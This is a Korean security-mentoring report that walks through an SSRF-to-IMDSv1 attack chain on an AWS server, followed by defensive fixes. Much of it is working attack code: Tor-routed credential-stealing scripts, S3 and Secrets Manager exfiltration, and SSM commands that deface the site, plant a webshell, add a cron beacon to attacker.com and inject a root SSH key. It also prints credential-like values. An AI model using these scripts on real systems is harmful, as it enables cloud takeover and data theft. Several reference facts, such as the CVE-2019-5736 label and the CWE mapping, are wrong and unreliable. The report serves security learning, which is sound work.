# AWS IMDSv1 취약점 공격 체인 - 완전 분석 보고서

**작성자**: 황준하 (멘티)
**희망분야**: AWS 클라우드 보안
**프로젝트 기간**: 2025년 11월
**멘토링**: 보안 전문가 현직자 멘토링 프로그램

---

## 📋 목차

1. [공격 개요](#공격-개요)
2. [취약점 분석](#취약점-분석)
3. [공격 체인 상세 분석](#공격-체인-상세-분석)
4. [코드 레벨 분석](#코드-레벨-분석)
5. [영향 평가](#영향-평가)
6. [방어 기법](#방어-기법)
7. [실제 사례](#실제-사례)
8. [교훈](#교훈)

---

## 공격 개요

### 시나리오 요약

**완벽해 보이는 보안 시스템**:
- ✅ ModSecurity WAF (웹 애플리케이션 방화벽)
- ✅ Splunk SIEM (보안 이벤트 모니터링)
- ✅ PHP disable_functions (위험 함수 비활성화)

**단 하나의 작은 실수**:
- ❌ `/api/health.php` 엔드포인트를 ModSecurity 예외로 설정
- ❌ 이유: "서버 모니터링에 필요하다"는 개발자의 판단
- ❌ AWS IMDSv1 활성화 (IMDSv2 전환 깜빡함)

**결과**:
- 🔥 전체 보안 시스템 무력화
- 🔥 AWS IAM Credentials 탈취
- 🔥 클라우드 인프라 완전 장악

---

## 취약점 분석

### 취약점 #1: ModSecurity WAF 예외 설정 (CRITICAL)

**위치**: `/etc/httpd/conf.d/mod_security.conf` (또는 Apache 설정 파일)

**취약한 설정**:
```apache
# ========================================
# Health Check Endpoint Exception
# ========================================
# 이유: 서버 모니터링 시스템이 정상 작동하려면
#       health check가 WAF 차단 없이 동작해야 함
# 승인: DevOps 팀장 (긴급)
# 날짜: 2024-11-10
# TODO: 더 안전한 방법으로 교체 필요
# ========================================

<LocationMatch "/api/health\.php">
    SecRuleEngine Off    # ← 치명적 실수!
</LocationMatch>
```

**왜 위험한가?**

1. **WAF 완전 우회**:
   - `SecRuleEngine Off` → 모든 ModSecurity 규칙 비활성화
   - SQL Injection, XSS, SSRF 등 모든 웹 공격 탐지 불가

2. **공격 표면 확대**:
   - 공격자가 `/api/health.php`를 발견하면 자유롭게 공격 가능
   - 다른 엔드포인트는 차단되지만 이 하나만으로 충분

3. **개발자의 의도 vs 실제 위험**:
   - 의도: "모니터링 시스템이 health check를 호출할 수 있게"
   - 실제: "공격자도 제한 없이 접근 가능"

**CVE/CWE**:
- CWE-756: Missing Custom Error Page
- CWE-209: Information Exposure Through an Error Message

---

### 취약점 #2: SSRF (Server-Side Request Forgery) (CRITICAL)

**위치**: `/var/www/html/www/api/health.php`

**취약한 코드**:
```php
case 'metadata':
    // AWS 메타데이터 (인스턴스 정보)
    // 내부 모니터링용 - IMDSv2 토큰 없이도 작동해야 함
    $url = isset($_GET['url']) ? $_GET['url'] : 'http://169.254.169.254/latest/meta-data/instance-id';

    // ↓↓↓ 위험한 부분 ↓↓↓
    $response['metadata'] = shell_exec("curl -s -m 5 " . escapeshellarg($url) . " 2>&1");
    break;
```

**취약점 트리거 방법**:

1. **공격 URL**:
   ```
   http://target.com/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```

2. **서버 측 실행 명령어**:
   ```bash
   curl -s -m 5 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>&1
   ```

3. **응답**:
   ```json
   {
     "status": "ok",
     "metadata": "MyEC2Role"
   }
   ```

**왜 위험한가?**

1. **내부 리소스 접근**:
   - `169.254.169.254` (AWS IMDS) 접근 가능
   - `127.0.0.1` (localhost) 접근 가능
   - 내부 네트워크 스캔 가능

2. **escapeshellarg()의 한계**:
   - SQL Injection은 막지만 SSRF는 못 막음
   - URL 자체는 유효하므로 그대로 curl에 전달됨

3. **shell_exec() 사용**:
   - PHP의 `disable_functions`로 차단되어야 하지만
   - Health check는 ModSecurity 예외이므로 정상 실행

**CVE/CWE**:
- CWE-918: Server-Side Request Forgery (SSRF)
- OWASP Top 10 2021: A10 - Server-Side Request Forgery

---

### 취약점 #3: AWS IMDSv1 활성화 (CRITICAL)

**설정 위치**: EC2 Instance Metadata Options

**취약한 설정**:
```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-08f3cc62a529c9daf \
    --http-tokens optional \      # ← IMDSv1 허용
    --http-endpoint enabled \
    --region ap-northeast-2
```

**안전한 설정** (IMDSv2):
```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-08f3cc62a529c9daf \
    --http-tokens required \      # ← IMDSv2만 허용
    --http-endpoint enabled \
    --region ap-northeast-2
```

**IMDSv1 vs IMDSv2 차이**:

| 특성 | IMDSv1 | IMDSv2 |
|------|--------|--------|
| **인증** | 없음 | 세션 토큰 필요 |
| **HTTP Method** | GET | PUT (토큰 요청) + GET |
| **SSRF 취약** | ✅ 매우 취약 | ❌ 안전 |
| **TTL 헤더** | 불필요 | 필수 (hop limit) |

**IMDSv1 공격 예시**:
```bash
# 1단계: 직접 접근 (인증 불필요)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2단계: Role 이름 획득
MyEC2Role

# 3단계: Credentials 탈취
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role

# 결과: AccessKeyId, SecretAccessKey, Token 모두 노출
```

**IMDSv2 방어** (공격 불가):
```bash
# 1단계: 토큰 요청 (PUT 메서드 + TTL 헤더 필수)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 2단계: 토큰과 함께 요청
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

SSRF 공격으로는 PUT 메서드와 커스텀 헤더를 보낼 수 없으므로 IMDSv2는 안전합니다!

**CVE/CWE**:
- CVE-2019-5736: SSRF via AWS IMDS
- CWE-306: Missing Authentication for Critical Function

---

## 공격 체인 상세 분석

### Phase 0: 정찰 (Reconnaissance)

**목표**: 취약한 엔드포인트 발견

**사용 도구**:
1. **포트 스캔** (Nmap):
   ```bash
   nmap -sV -p 80,443,22,3306 52.79.240.83
   ```

   출력:
   ```
   PORT    STATE SERVICE VERSION
   22/tcp  open  ssh     OpenSSH 9.0
   80/tcp  open  http    Apache 2.4.65
   443/tcp closed https
   ```

2. **디렉터리 브루트포스** (Gobuster):
   ```bash
   gobuster dir -u http://52.79.240.83 \
     -w /usr/share/wordlists/dirb/common.txt \
     -t 50
   ```

   발견:
   ```
   /api (Status: 301)
   /api/health.php (Status: 200)
   /uploads (Status: 301)
   /admin (Status: 403)
   ```

3. **엔드포인트 테스트**:
   ```bash
   curl http://52.79.240.83/api/health.php
   ```

   응답:
   ```json
   {
     "status": "ok",
     "timestamp": 1731767234,
     "server": "ip-172-31-9-87.ap-northeast-2.compute.internal"
   }
   ```

**발견**:
- ✅ `/api/health.php` 존재
- ✅ JSON 응답 → 파라미터 테스트 가능성
- ✅ `server` 필드 → AWS 인스턴스 확인

---

### Phase 1: 취약점 확인 (Vulnerability Verification)

**목표**: Health check 엔드포인트가 SSRF에 취약한지 확인

**테스트 1: 파라미터 발견**
```bash
# ?check 파라미터 테스트
curl "http://52.79.240.83/api/health.php?check=disk"
```

응답:
```json
{
  "status": "ok",
  "disk": "Filesystem      Size  Used Avail Use% Mounted on\n/dev/xvda1       20G  5.2G   15G  26% /"
}
```

**발견**: `shell_exec()` 실행 확인!

**테스트 2: SSRF 테스트**
```bash
# metadata 파라미터로 IMDS 접근 시도
curl "http://52.79.240.83/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/"
```

응답:
```json
{
  "status": "ok",
  "metadata": "ami-id\nami-launch-index\nami-manifest-path\n..."
}
```

**발견**: ✅ SSRF 취약점 확인! IMDS 접근 가능!

---

### Phase 2: Python 자동화 스크립트 (`120_aws_imds_exploit.py`)

**목표**: SSRF를 통해 AWS IAM Credentials 자동 탈취

#### 코드 구조 분석

**1. 초기화 및 Tor 설정**:
```python
class AWSIMDSExploit:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.health_endpoint = f"{self.base_url}/api/health.php"

        # Tor 프록시 설정 (IP 추적 방지)
        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
```

**왜 Tor를 사용하는가?**
- 공격자 IP 숨김
- ISP 로깅 회피
- Splunk SIEM이 공격자 IP를 추적하더라도 Tor Exit Node만 보임

**2. SSRF 실행 함수**:
```python
def execute_ssrf(self, url):
    """Health check 엔드포인트를 통한 SSRF"""
    try:
        params = {
            'check': 'metadata',
            'url': url  # ← IMDS URL 주입
        }

        resp = self.session.get(self.health_endpoint, params=params, timeout=15)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if 'metadata' in data:
                    return data['metadata']  # ← IMDS 응답 반환
            except json.JSONDecodeError:
                return resp.text.strip()
    except requests.exceptions.RequestException as e:
        print(f"[-] 요청 오류: {str(e)}")
        return None
```

**HTTP 요청 흐름**:
```
공격자 PC (Tor)
  ↓
  HTTP GET http://52.79.240.83/api/health.php?check=metadata&url=http://169.254.169.254/...
  ↓
ModSecurity WAF
  ↓ (예외 처리로 통과)
Apache → PHP (health.php)
  ↓
  shell_exec("curl -s -m 5 'http://169.254.169.254/...'")
  ↓
AWS IMDS (169.254.169.254)
  ↓
  IAM Credentials 반환
  ↓
JSON 응답 → 공격자에게 전송
```

**3. IAM Role 확인**:
```python
def check_iam_role(self):
    """IAM Role 확인"""
    url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    role_name = self.execute_ssrf(url)

    if role_name and role_name != '404 - Not Found':
        print(f"[+] ✅ IAM Role 발견: {role_name}")
        return role_name.strip()
    else:
        print("[-] IAM Role이 연결되어 있지 않습니다")
        return None
```

**실제 HTTP 요청**:
```http
GET /api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 52.79.240.83
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

**서버 측 실행**:
```bash
curl -s -m 5 "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**IMDS 응답**:
```
MyEC2Role
```

**4. Credentials 탈취**:
```python
def steal_credentials(self, role_name):
    """IAM 자격 증명 탈취"""
    url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
    creds_json = self.execute_ssrf(url)

    try:
        creds = json.loads(creds_json)

        if 'AccessKeyId' in creds and 'SecretAccessKey' in creds:
            self.credentials = creds

            print("[+] ✅✅✅ AWS 자격 증명 탈취 성공!")
            print(f"AccessKeyId:     {creds.get('AccessKeyId')}")
            print(f"SecretAccessKey: {creds.get('SecretAccessKey')[:30]}...")
            print(f"Token:           {creds.get('Token')[:30]}...")

            return creds
    except json.JSONDecodeError:
        print("[-] JSON 파싱 실패")
        return None
```

**실제 탈취된 Credentials 예시**:
```json
{
  "Code": "Success",
  "LastUpdated": "2025-11-16T04:52:18Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIASO4TYV4OK2MJVZDV",
  "SecretAccessKey": "7H1nyRK6iZ80K2Tthpq7RhQVGCD+HNyjcsg4QfIE",
  "Token": "IQoJb3JpZ2luX2VjEMf//////////wEaDmFwLW5vcnRoZWFzdC0yIkYwRAIgWxmZ...",
  "Expiration": "2025-11-16T11:05:33Z"
}
```

**5. Credentials 저장 및 활용**:
```python
def save_credentials(self):
    """자격 증명을 파일로 저장"""
    timestamp = int(time.time())

    # AWS CLI 형식으로 저장
    aws_config = f"""# AWS 자격 증명 (탈취)
export AWS_ACCESS_KEY_ID="{self.credentials.get('AccessKeyId')}"
export AWS_SECRET_ACCESS_KEY="{self.credentials.get('SecretAccessKey')}"
export AWS_SESSION_TOKEN="{self.credentials.get('Token')}"

# 사용법:
# source aws_stolen_{timestamp}.sh
# aws sts get-caller-identity
"""

    filename = f"aws_stolen_{timestamp}.sh"
    with open(filename, 'w') as f:
        f.write(aws_config)

    print(f"[+] AWS CLI 설정: {filename}")
```

**저장된 파일 사용**:
```bash
# 1. 환경 변수 로드
source aws_stolen_1731767234.sh

# 2. 신원 확인
aws sts get-caller-identity
```

출력:
```json
{
  "UserId": "AROASO4TYV4ONMEXAMPLE:i-08f3cc62a529c9daf",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/MyEC2Role/i-08f3cc62a529c9daf"
}
```

**✅ 공격 성공! AWS 계정 접근 권한 획득!**

---

### Phase 3: AWS 인프라 열거 (`121_aws_privilege_escalation.py`)

**목표**: 탈취한 Credentials로 AWS 리소스 탐색

#### 주요 기능

**1. EC2 인스턴스 열거**:
```python
import boto3

# 탈취한 credentials 사용
session = boto3.Session(
    aws_access_key_id='ASIASO4TYV4OK2MJVZDV',
    aws_secret_access_key='7H1nyRK...',
    aws_session_token='IQoJb3J...',
    region_name='ap-northeast-2'
)

ec2 = session.client('ec2')
instances = ec2.describe_instances()

for reservation in instances['Reservations']:
    for instance in reservation['Instances']:
        print(f"[+] Instance: {instance['InstanceId']}")
        print(f"    State: {instance['State']['Name']}")
        print(f"    Private IP: {instance.get('PrivateIpAddress')}")
        print(f"    Public IP: {instance.get('PublicIpAddress')}")
        print(f"    IAM Role: {instance.get('IamInstanceProfile', {}).get('Arn')}")
```

**발견 가능한 정보**:
- 다른 EC2 인스턴스 (Admin 서버, DB 서버 등)
- Security Groups (방화벽 규칙)
- Key Pairs (SSH 키 이름)
- Tags (서버 용도, 부서 등)

**2. S3 버킷 열거 및 다운로드**:
```python
s3 = session.client('s3')
buckets = s3.list_buckets()

for bucket in buckets['Buckets']:
    print(f"[+] Bucket: {bucket['Name']}")

    # 버킷 내용 확인
    try:
        objects = s3.list_objects_v2(Bucket=bucket['Name'], MaxKeys=10)
        if 'Contents' in objects:
            for obj in objects['Contents']:
                print(f"    - {obj['Key']} ({obj['Size']} bytes)")

                # 민감 파일 다운로드
                if obj['Key'].endswith(('.sql', '.env', '.pem', '.key')):
                    print(f"    [!] 민감 파일 발견! 다운로드 중...")
                    s3.download_file(bucket['Name'], obj['Key'], f"stolen_{obj['Key']}")
    except Exception as e:
        print(f"    [-] 접근 불가: {str(e)}")
```

**탈취 가능한 데이터**:
- 백업 파일 (database-backup.sql)
- 환경 변수 (.env)
- SSH 키 (.pem)
- 로그 파일 (application.log)
- 고객 데이터 (users-export.csv)

**3. RDS 데이터베이스 정보 수집**:
```python
rds = session.client('rds')
databases = rds.describe_db_instances()

for db in databases['DBInstances']:
    print(f"[+] Database: {db['DBInstanceIdentifier']}")
    print(f"    Engine: {db['Engine']} {db['EngineVersion']}")
    print(f"    Endpoint: {db['Endpoint']['Address']}:{db['Endpoint']['Port']}")
    print(f"    Master Username: {db['MasterUsername']}")
    print(f"    VPC Security Groups: {db['VpcSecurityGroups']}")
```

**다음 공격 가능성**:
- DB 엔드포인트로 직접 연결 시도
- 백업에서 마스터 비밀번호 찾기
- Secrets Manager에서 DB 비밀번호 찾기

**4. Secrets Manager 탈취**:
```python
secretsmanager = session.client('secretsmanager')
secrets = secretsmanager.list_secrets()

for secret in secrets['SecretList']:
    print(f"[+] Secret: {secret['Name']}")

    try:
        # 실제 비밀 값 가져오기
        secret_value = secretsmanager.get_secret_value(SecretId=secret['ARN'])
        print(f"    Value: {secret_value['SecretString']}")
    except Exception as e:
        print(f"    [-] 접근 불가: {str(e)}")
```

**탈취 가능한 비밀**:
- 데이터베이스 비밀번호
- API 키 (Stripe, SendGrid 등)
- 외부 서비스 토큰
- 암호화 키

---

### Phase 4: 시스템 장악 (`122_aws_ssm_command.py`)

**목표**: AWS Systems Manager를 통해 EC2 인스턴스에 원격 명령 실행

#### SSM (Systems Manager)란?

- AWS의 관리 서비스
- SSH 없이 EC2 인스턴스에 명령 실행 가능
- CloudTrail에만 로그 남음 (SSH 로그보다 덜 눈에 띔)

#### 공격 코드:

```python
import boto3
import time

session = boto3.Session(
    aws_access_key_id='ASIASO4TYV4OK2MJVZDV',
    aws_secret_access_key='7H1nyRK...',
    aws_session_token='IQoJb3J...'
)

ssm = session.client('ssm', region_name='ap-northeast-2')

def execute_command(instance_id, command):
    """SSM을 통해 명령 실행"""

    # 명령 전송
    response = ssm.send_command(
        InstanceIds=[instance_id],
        DocumentName='AWS-RunShellScript',
        Parameters={
            'commands': [command]
        }
    )

    command_id = response['Command']['CommandId']

    # 결과 대기
    time.sleep(3)

    # 결과 가져오기
    output = ssm.get_command_invocation(
        CommandId=command_id,
        InstanceId=instance_id
    )

    return output['StandardOutputContent']

# 사용 예시
instance_id = 'i-08f3cc62a529c9daf'

# 1. 시스템 정보 확인
print(execute_command(instance_id, 'uname -a'))

# 2. 사용자 확인
print(execute_command(instance_id, 'whoami'))

# 3. 웹사이트 변조
deface_cmd = """
cat > /var/www/html/www/index.php << 'EOF'
<!DOCTYPE html>
<html>
<head><title>HACKED</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;padding:50px;">
<h1>SYSTEM COMPROMISED</h1>
<p>AWS IMDSv1 vulnerability exploited</p>
<p>Attack chain:</p>
<ol>
<li>/api/health.php discovered (ModSecurity exception)</li>
<li>SSRF triggered via ?check=metadata parameter</li>
<li>IMDSv1 → IAM credentials stolen</li>
<li>AWS infrastructure enumerated</li>
<li>SSM command execution → Full system takeover</li>
</ol>
</body>
</html>
EOF

chown apache:apache /var/www/html/www/index.php
systemctl restart httpd
"""

execute_command(instance_id, deface_cmd)
print("[+] Website defaced!")

# 4. 백도어 설치
backdoor_cmd = """
# 웹셸 설치
cat > /var/www/html/www/.backdoor.php << 'EOF'
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# Cron job 백도어 (재부팅 후에도 유지)
(crontab -l 2>/dev/null; echo "*/5 * * * * curl http://attacker.com/beacon?host=$(hostname)") | crontab -

# SSH 키 추가
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAA... attacker@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
"""

execute_command(instance_id, backdoor_cmd)
print("[+] Backdoor installed!")
```

**백도어 효과**:
1. **웹셸**: `http://target.com/.backdoor.php?cmd=whoami`
2. **Cron job**: 5분마다 공격자 서버에 비콘 전송
3. **SSH 키**: 공격자가 root로 SSH 접속 가능

---

## 영향 평가

### 기술적 영향

| 보안 속성 | 심각도 | 상세 내용 |
|----------|--------|-----------|
| **기밀성 (Confidentiality)** | ⚠️ CRITICAL | • AWS IAM Credentials 완전 노출<br>• EC2, S3, RDS, Secrets Manager 모든 리소스 접근<br>• 고객 데이터, 백업, 로그 모두 탈취 가능 |
| **무결성 (Integrity)** | ⚠️ CRITICAL | • 웹사이트 변조<br>• 시스템 파일 수정<br>• 백도어 설치<br>• 데이터베이스 변조 가능 |
| **가용성 (Availability)** | ⚠️ HIGH | • 서비스 중단 가능<br>• 랜섬웨어 설치 가능<br>• EC2 인스턴스 종료 가능 |

### 비즈니스 영향

**1. 재정적 손실**:
- **즉시 손실**:
  - AWS 리소스 무단 사용 (크립토마이닝 등)
  - 서비스 중단으로 인한 매출 손실

- **장기 손실**:
  - 고객 이탈
  - 브랜드 이미지 하락
  - 주가 하락 (상장사의 경우)

**2. 법적 벌금**:
- **GDPR** (유럽): 최대 €20M 또는 연 매출의 4%
- **개인정보보호법** (한국): 최대 5억원
- **전자금융거래법** (금융 서비스): 최대 10년 이하 징역

**3. 사례 기반 추정**:

| 회사 | 사건 | 피해 규모 |
|------|------|-----------|
| **Capital One (2019)** | SSRF + IMDSv1 | • 1억 고객 정보 유출<br>• 벌금 $80M<br>• 주가 6% 하락 |
| **Tesla (2018)** | K8s + IMDSv1 | • 크립토마이닝<br>• AWS 계정 탈취<br>• 명확한 피해액 미공개 |

---

## 방어 기법

### 즉시 조치 (Immediate - 24시간 내)

**1. IMDSv2 강제 활성화**:
```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-08f3cc62a529c9daf \
    --http-tokens required \           # ← IMDSv2만 허용
    --http-endpoint enabled \
    --region ap-northeast-2
```

**검증**:
```bash
# IMDSv1 접근 시도 (차단되어야 함)
curl http://169.254.169.254/latest/meta-data/
# 출력: 401 Unauthorized

# IMDSv2 접근 (정상 작동)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/ \
  -H "X-aws-ec2-metadata-token: $TOKEN"
# 출력: ami-id, instance-id, ...
```

**2. ModSecurity 예외 제거 또는 제한**:
```apache
# 방법 1: 예외 완전 제거 (가장 안전)
# <LocationMatch "/api/health\.php">
#     SecRuleEngine Off
# </LocationMatch>

# 방법 2: 특정 규칙만 예외 (차선책)
<LocationMatch "/api/health\.php">
    # SSRF 관련 규칙은 유지
    SecRuleRemoveById 920350 920360   # 특정 False Positive 규칙만 제거
    # SecRuleEngine Off는 사용 안 함!
</LocationMatch>
```

**3. SSRF 입력 검증 강화**:
```php
<?php
// 화이트리스트 방식
$allowed_hosts = ['api.example.com', 'monitoring.example.com'];
$url = $_GET['url'];
$parsed = parse_url($url);

// 호스트 검증
if (!in_array($parsed['host'], $allowed_hosts)) {
    die(json_encode(['error' => 'Invalid host']));
}

// 내부 IP 차단
$ip = gethostbyname($parsed['host']);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    die(json_encode(['error' => 'Private IP blocked']));
}

// 169.254.0.0/16 명시적 차단
if (preg_match('/^169\.254\./', $ip)) {
    die(json_encode(['error' => 'IMDS access blocked']));
}

// 안전하게 요청
$response = shell_exec("curl -s -m 5 " . escapeshellarg($url));
?>
```

**4. 백도어 제거**:
```bash
# 웹셸 검색 및 제거
find /var/www/html -name "*.php" -exec grep -l "system\|exec\|shell_exec\|passthru" {} \;
rm -f /var/www/html/www/.backdoor.php

# Cron job 확인
crontab -l
crontab -r  # 의심스러운 항목이 있으면 전체 제거 후 재설정

# SSH authorized_keys 확인
cat /root/.ssh/authorized_keys
# 의심스러운 키 제거
```

---

### 단기 조치 (Short-term - 1주일 내)

**1. Network ACL 강화**:
```bash
# iptables로 IMDS 접근 제한
sudo iptables -A OUTPUT -d 169.254.169.254 \
  -m owner --uid-owner apache \
  -j DROP

# 또는 Security Group으로 제한
# (AWS Console에서 설정)
```

**2. WAF 규칙 강화**:
```apache
# ModSecurity SSRF 방어 규칙 추가
SecRule ARGS "@rx 169\.254\.169\.254" \
  "id:1001,phase:2,deny,status:403,msg:'IMDS SSRF attempt'"

SecRule ARGS "@rx 127\.0\.0\.1|localhost" \
  "id:1002,phase:2,deny,status:403,msg:'Localhost SSRF attempt'"
```

**3. 로그 모니터링 강화**:
```python
# Splunk SIEM 규칙 예시
index=web sourcetype=apache_access
| search uri_path="/api/health.php"
        AND (uri_query="*169.254.169.254*" OR uri_query="*metadata*")
| table _time, src_ip, uri, user_agent
| eval severity="CRITICAL"
| eval alert="IMDS SSRF Attempt Detected"
```

**4. IAM Role 권한 최소화**:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "ssm:UpdateInstanceInformation",
        "ssmmessages:CreateControlChannel",
        "ssmmessages:CreateDataChannel",
        "ssmmessages:OpenControlChannel",
        "ssmmessages:OpenDataChannel"
      ],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject"
      ],
      "Resource": "arn:aws:s3:::my-app-config-bucket/*"
    }
  ]
}
```

**기존 (과도한 권한)**:
```json
{
  "Effect": "Allow",
  "Action": "s3:*",
  "Resource": "*"
}
```

---

### 장기 조치 (Long-term - 1개월 내)

**1. VPC Endpoint 사용**:
```bash
# S3 VPC Endpoint 생성
aws ec2 create-vpc-endpoint \
  --vpc-id vpc-12345678 \
  --service-name com.amazonaws.ap-northeast-2.s3 \
  --route-table-ids rtb-12345678
```

**장점**:
- 인터넷 게이트웨이 없이 AWS 서비스 접근
- SSRF 공격으로 외부 접근 불가

**2. VPC Flow Logs 활성화**:
```bash
aws ec2 create-flow-logs \
  --resource-type VPC \
  --resource-id vpc-12345678 \
  --traffic-type ALL \
  --log-destination-type cloud-watch-logs \
  --log-group-name /aws/vpc/flowlogs
```

**탐지 가능**:
- 169.254.169.254로의 비정상적인 요청
- 외부로의 데이터 유출

**3. 정기 취약점 스캔**:
```bash
# AWS Inspector 활성화
aws inspector2 enable \
  --resource-types EC2

# 주기적으로 스캔 결과 확인
aws inspector2 list-findings \
  --filter-criteria severities=CRITICAL,HIGH
```

**4. Zero Trust 아키텍처 전환**:
- 모든 요청에 인증 필요
- 네트워크 위치가 아닌 ID 기반 접근 제어
- 최소 권한 원칙 적용

---

## 실제 사례

### Capital One (2019)

**공격 개요**:
- 날짜: 2019년 3월
- 발견: 2019년 7월
- 피해: 1억 600만 고객 정보 유출

**공격 방법**:
1. WAF(ModSecurity) 오설정 발견
2. SSRF 취약점을 통해 IMDSv1 접근
3. IAM Credentials 탈취
4. S3 버킷에서 고객 데이터 다운로드

**피해 규모**:
- 벌금: $80 million (SEC)
- 주가: 6% 하락
- 소송: 집단 소송 진행 중
- 명성: 치명적 타격

**교훈**:
- "완벽한 WAF"도 예외 설정 하나로 무력화
- IMDSv2 미적용의 치명성
- 최소 권한 원칙 위반 (S3 전체 접근 권한)

**출처**:
- [KrebsOnSecurity](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/)
- [AWS Blog](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)

---

### Tesla (2018)

**공격 개요**:
- 날짜: 2018년 2월
- 발견: RedLock (Palo Alto Networks)
- 피해: 크립토마이닝

**공격 방법**:
1. Kubernetes 관리 콘솔 노출 (비밀번호 없음)
2. 컨테이너에서 IMDS 접근
3. IAM Credentials로 S3 접근
4. EC2 인스턴스에서 크립토마이닝

**피해 규모**:
- AWS 청구 비용 급증
- 고객 데이터 노출 (내부 텔레메트리)
- 명성 피해

**교훈**:
- 관리 콘솔 노출 금지
- IMDSv2 필수
- 네트워크 세그멘테이션

**출처**:
- [RedLock Blog](https://redlock.io/blog/cryptojacking-tesla)

---

## 교훈

### 1. "완벽한 보안"은 환상이다

```
99% 보안 + 1% 작은 틈 = 0% 보안
```

이 프로젝트에서:
- ✅ ModSecurity WAF: 완벽하게 작동
- ✅ Splunk SIEM: 정상 탐지
- ✅ PHP disable_functions: 올바르게 설정
- ❌ **단 하나의 예외** (/api/health.php): 모든 것을 무너뜨림

**실제 사례**:
- Capital One: 완벽한 WAF + 한 개 예외 = $80M 벌금
- Equifax: 완벽한 보안 + Apache Struts 미패치 = 1억 4천만 개인정보 유출

---

### 2. 편의성 vs 보안

**개발자의 생각**:
```
"모니터링 시스템이 health check를 못 하면 장애 감지가 안 되잖아?"
"급하니까 일단 ModSecurity 예외 추가하고 나중에 고치지 뭐"
"IMDSv2로 바꾸면 기존 스크립트 다 수정해야 해... 일단 v1로 두자"
```

**공격자의 생각**:
```
"오! health.php가 WAF 예외네?"
"SSRF 테스트해볼까?"
"IMDSv1이면 credentials 탈취 가능!"
```

**교훈**:
- 편의를 위한 보안 예외는 재앙의 시작
- "나중에 고치겠다"는 절대 안 고쳐짐
- 보안 설정은 **처음부터 올바르게**

---

### 3. Defense in Depth의 중요성

**잘못된 접근** (이 프로젝트):
```
Layer 1: WAF (ModSecurity) → 예외 설정으로 무력화
Layer 2: 없음
Layer 3: 없음
Layer 4: SIEM (Splunk) → 로그는 남지만 실시간 차단 안 함
```

**올바른 접근**:
```
Layer 1: WAF (ModSecurity) → 예외 최소화
Layer 2: Application (입력 검증) → 화이트리스트
Layer 3: Network (IMDS 차단) → iptables/VPC Endpoint
Layer 4: Cloud (IMDSv2) → 토큰 기반 인증
Layer 5: IAM (최소 권한) → 필요한 권한만
Layer 6: Monitoring (SIEM) → 실시간 알림
```

**한 계층이 뚫려도** 다음 계층에서 막을 수 있어야 함!

---

### 4. 입력은 절대 신뢰하지 마라

**잘못된 코드**:
```php
$url = $_GET['url'];
$response = shell_exec("curl -s " . escapeshellarg($url));
```

**문제**:
- `escapeshellarg()`는 쉘 인젝션만 막음
- SSRF는 못 막음 (URL 자체는 유효하므로)

**올바른 코드**:
```php
// 1. 화이트리스트
$allowed_hosts = ['api.example.com'];
$parsed = parse_url($_GET['url']);

if (!in_array($parsed['host'], $allowed_hosts)) {
    die('Invalid host');
}

// 2. 내부 IP 차단
$ip = gethostbyname($parsed['host']);
if (preg_match('/^(10|127|172\.(1[6-9]|2[0-9]|3[01])|192\.168|169\.254)\./', $ip)) {
    die('Private IP blocked');
}

// 3. 안전하게 요청
$response = shell_exec("curl -s " . escapeshellarg($_GET['url']));
```

---

## 결론

### 공격 요약

1. **정찰**: 포트 스캔 및 디렉터리 브루트포스로 `/api/health.php` 발견
2. **취약점 확인**: ModSecurity 예외 확인, SSRF 테스트 성공
3. **자격 증명 탈취**: Python 스크립트로 IMDS → IAM Credentials 획득
4. **인프라 열거**: EC2, S3, RDS, Secrets Manager 탐색
5. **시스템 장악**: SSM을 통해 원격 명령 실행, 백도어 설치

### 핵심 메시지

> **"편의를 위한 보안 예외 하나가 전체 시스템을 무너뜨린다"**

아무리 강력한 보안 시스템도,
단 하나의 예외로 모두 무너질 수 있습니다.

보안은 체인과 같습니다.
**가장 약한 고리가 전체 강도를 결정합니다.**

---

## 참고 자료

### CVE & CWE
- **CVE-2019-5736**: SSRF via AWS IMDS
- **CWE-918**: Server-Side Request Forgery
- **CWE-306**: Missing Authentication for Critical Function
- **CWE-756**: Missing Custom Error Page

### AWS 문서
